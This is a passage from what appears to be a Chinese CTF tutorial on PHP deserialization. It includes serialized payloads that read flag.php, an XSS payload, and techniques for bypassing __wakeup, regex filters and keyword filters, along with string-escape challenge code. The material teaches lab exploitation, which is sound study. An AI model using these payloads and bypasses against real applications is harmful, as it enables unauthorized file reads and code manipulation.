class="comment">//O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\00%2A\00op%22%3BS%3A2%3A%22+2%22%3BS%3A11%3A%22\00%2A\00filename%22%3BS%3A8%3A%22flag.php%22%3BS%3A10%3A%22\00%2A\00content%22%3BN%3B%7D</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A5%3A%22%00%2A%00op%22%3Bi%3A2%3Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3Bs%3A10%3A%22%00%2A%00content%22%3BN%3B%7D</span></span><br></pre></td></tr></table></figure><p><strong>pikachu</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!@<span class="variable">$unser</span> = unserialize(<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;<span class="subst">&#123;$unser-&gt;test&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取payload</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$unser</span> = <span class="keyword">new</span> S();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$unser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;;&#125;</span></span><br></pre></td></tr></table></figure><h3 id="1-5-2-“百度杯”CTF比赛-十月场"><a href="#1-5-2-“百度杯”CTF比赛-十月场" class="headerlink" title="1.5.2 “百度杯”CTF比赛 十月场"></a>1.5.2 “百度杯”CTF比赛 十月场</h3><p><a href="https://www.ichunqiu.com/battalion?t=1&r=54967">题目链接</a></p><p>index.php?key=123&amp;hash=f9109d5f83921a551cf859f853afe7bb</p><p>查看源代码</p><p><img src="https://i.loli.net/2021/09/10/XohASq2FvtG3Q4C.png" alt="image-20210910214204513"></p><p>进行 md5 解密，得到  <em>kkkkkk01123</em> </p><p>则 <code>$key=</code></p><p>根据题目，不能使 ?key=123</p><p>则我们传入 ?key=111&amp;hash=adaa10eef3a02754da03b5a3a6f40ae6</p><p>得到 next step is Gu3ss_m3_h2h2.php</p><p>然后我们访问 Gu3ss_m3_h2h2.php</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Demo &#123;</span><br><span class="line">    private <span class="variable">$file</span> = <span class="string">&#x27;Gu3ss_m3_h2h2.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>() &#123;</span><br><span class="line">        <span class="built_in">echo</span> @highlight_file(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>() &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;file != <span class="string">&#x27;Gu3ss_m3_h2h2.php&#x27;</span>) &#123;</span><br><span class="line">            //the secret is <span class="keyword">in</span> the f15g_1s_here.php</span><br><span class="line">            <span class="variable">$this</span>-&gt;file = <span class="string">&#x27;Gu3ss_m3_h2h2.php&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$var</span> = base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123;</span><br><span class="line">        die(<span class="string">&#x27;stop hacking!&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        @unserialize(<span class="variable">$var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="string">&quot;Gu3ss_m3_h2h2.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="1-6-反序列化绕过技巧"><a href="#1-6-反序列化绕过技巧" class="headerlink" title="1.6 反序列化绕过技巧"></a>1.6 反序列化绕过技巧</h2><h3 id="1-6-1-php7-1-反序列化对类属性不敏感"><a href="#1-6-1-php7-1-反序列化对类属性不敏感" class="headerlink" title="1.6.1 php7.1+反序列化对类属性不敏感"></a>1.6.1 php7.1+反序列化对类属性不敏感</h3><p>测试环境：php7.2.9</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class <span class="built_in">test</span>&#123;</span><br><span class="line">    protected <span class="variable">$a</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span>  <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize(<span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/10/zupN4kL8dmvtAEK.png" alt="image-20210910173603013"></p><p>可以看到，即是 a 没有<code>%00*%00</code></p><p>也输出了 <code>abc</code></p><h3 id="1-6-2-wakeup-绕过"><a href="#1-6-2-wakeup-绕过" class="headerlink" title="1.6.2 __wakeup() 绕过"></a>1.6.2 <code>__wakeup()</code> 绕过</h3><p><strong>在反序列化字符串时，序列化字符串中属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行 。</strong></p><p>环境： PHP5 &lt; 5.6.2   PHP7 &lt; 7.0.10</p><p>测试：php5.2.17</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;a = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&#x27;bbb&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$b = new test();</span></span><br><span class="line"><span class="comment">//echo serialize($b);</span></span><br><span class="line"><span class="comment">//O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;&#125;aaa</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//属性个数 为 真实个数值  1</span></span><br><span class="line">unserialize(<span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//属性个数 3 &gt; 真实个数值 1</span></span><br><span class="line">unserialize(<span class="string">&#x27;O:4:&quot;test&quot;:3:&#123;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/10/ZmtHakew1TCRDVr.png" alt="image-20210910175548494"></p><h3 id="1-6-3-正则绕过"><a href="#1-6-3-正则绕过" class="headerlink" title="1.6.3 正则绕过"></a>1.6.3 正则绕过</h3><p><code>preg_match(&#39;/^O:\d+/&#39;)</code>匹配序列化字符串是否是对象字符串开头</p><p>其中的 \d 匹配的是数字 [0-9]，其目的就是检测我们的字符串是否是对象字符串开头</p><p><strong>绕过1：<code>+</code> 绕过 (url 中传参使用 编码 %2b)</strong></p><p><strong>绕过2：<code>serialize(array(a))</code> 绕过  //a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)</strong></p><p>测试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;a.PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">match</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^O:\d+/&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;you lose!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">// +号绕过</span></span><br><span class="line"><span class="variable">$b</span> = str_replace(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line">unserialize(<span class="keyword">match</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="comment">// serialize(array($a));</span></span><br><span class="line">unserialize(<span class="string">&#x27;a:1:&#123;i:0;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="1-6-4-十六进制绕过字符过滤"><a href="#1-6-4-十六进制绕过字符过滤" class="headerlink" title="1.6.4 十六进制绕过字符过滤"></a>1.6.4 十六进制绕过字符过滤</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:4:<span class="string">&quot;test&quot;</span>:2:&#123;s:4:<span class="string">&quot;%00*%00a&quot;</span>;s:3:<span class="string">&quot;abc&quot;</span>;s:7:<span class="string">&quot;%00test%00b&quot;</span>;s:3:<span class="string">&quot;def&quot;</span>;&#125;</span><br><span class="line">可以写成</span><br><span class="line">O:4:<span class="string">&quot;test&quot;</span>:2:&#123;S:4:<span class="string">&quot;\00*\00\61&quot;</span>;s:3:<span class="string">&quot;abc&quot;</span>;s:7:<span class="string">&quot;%00test%00b&quot;</span>;s:3:<span class="string">&quot;def&quot;</span>;&#125;</span><br><span class="line">表示字符类型的s大写时，会被当成16进制解析。</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class <span class="built_in">test</span>&#123;</span><br><span class="line">    public <span class="variable">$username</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;username = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span>  <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">        <span class="built_in">echo</span> 666;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> check(<span class="variable">$data</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(stristr(<span class="variable">$data</span>, <span class="string">&#x27;username&#x27;</span>)!==False)&#123;</span><br><span class="line">        <span class="built_in">echo</span>(<span class="string">&quot;你绕不过！！&quot;</span>.PHP_EOL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// 未作处理前</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = check(<span class="variable">$a</span>);</span><br><span class="line">unserialize(<span class="variable">$a</span>);</span><br><span class="line">// 做处理后 \75是u的16进制</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = check(<span class="variable">$a</span>);</span><br><span class="line">unserialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><h3 id="1-6-5-引用"><a href="#1-6-5-引用" class="headerlink" title="1.6.5 引用"></a>1.6.5 引用</h3><p>测试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__contruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = &amp;<span class="keyword">$this</span>-&gt;a; <span class="comment">// $b 是 $a 的引用,从而使a 与 b 永远相等</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;a === <span class="keyword">$this</span>-&gt;b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;success&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = serialize(nre test());</span><br></pre></td></tr></table></figure><h1 id="二、反序列化字符串逃逸"><a href="#二、反序列化字符串逃逸" class="headerlink" title="二、反序列化字符串逃逸"></a>二、反序列化字符串逃逸</h1><p>概述：反序列化的字符串逃逸，包括字符增加与字符减少两类。</p><h2 id="2-1-知识一："><a href="#2-1-知识一：" class="headerlink" title="2.1 知识一："></a>2.1 知识一：</h2><ul><li>PHP 反序列化时，对类中不存在的属性也会反序列化；</li><li>PHP 反序列化时，底层代码是以 <code>;</code>作为字段的分隔，以 <code>&#125;</code> 作为结尾(字符串除外)，并且是根据长度判断内容的；即当存在 <code>;&#125;</code> 与 <code>&#123;</code>  匹配时，不会再对 <code>;&#125;</code> 后面的字符串进行反序列化。</li></ul><p> <strong>简单理解一下</strong></p><p><img src="https://i.loli.net/2021/06/12/wOtFRIT7QracXNJ.png" alt="image-20210612153444877"></p><p><img src="https://i.loli.net/2021/06/12/yp5auIfPciTKWe3.png" alt="image-20210612153557488"></p><p>我们在序列化之后的字符串 <code>;&#125;</code> 后再加上一些内容，其仍可被正常解析，说明在 PHP 反序列时碰到 <code>;&#125;</code> 与前面的 <code>&#123;</code> 配对之后，就会停止反序列化。</p><h2 id="2-2-知识二："><a href="#2-2-知识二：" class="headerlink" title="2.2 知识二："></a>2.2 知识二：</h2><ul><li>当进行反序列化的字符串中长度与所描述的长度不同时，就会 <strong>报错</strong></li></ul><h2 id="2-3-字符增多-—-CTF-Show-264"><a href="#2-3-字符增多-—-CTF-Show-264" class="headerlink" title="2.3 字符增多 — CTF Show 264"></a>2.3 字符增多 — CTF Show 264</h2><p><a href="https://ctf.show/challenges#web264-724">题目链接</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># message.php：</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = unserialize(base64_decode(<span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># index.php:</span></span><br><span class="line">Your message has been sent <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> message(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = str_replace(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, serialize(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]=base64_encode(<span class="variable">$umsg</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p><strong>分析：</strong></p><blockquote><ol><li>想要获取 flag，需要使 <code>$msg-&gt;token==&#39;admin&#39;</code> ，而默认 <code>public $token=&#39;user&#39;;</code></li><li>字符串逃逸：构造 以下内容</li></ol></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span> = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span> = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> 